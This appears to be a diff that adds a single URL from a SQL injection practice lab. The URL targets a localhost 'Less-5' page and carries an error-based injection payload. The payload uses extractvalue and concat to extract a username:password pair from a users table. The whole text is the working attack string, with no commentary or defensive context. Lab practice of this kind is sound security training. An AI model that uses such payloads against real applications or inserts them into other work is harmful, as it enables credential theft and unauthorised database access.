@@ -1,0 +1,3 @@
+http://localhost:3000/Less-5/?id=' and extractvalue(id,concat(0x12a,(select concat(username,':',password) from users limit 1,1)))--+
+
+
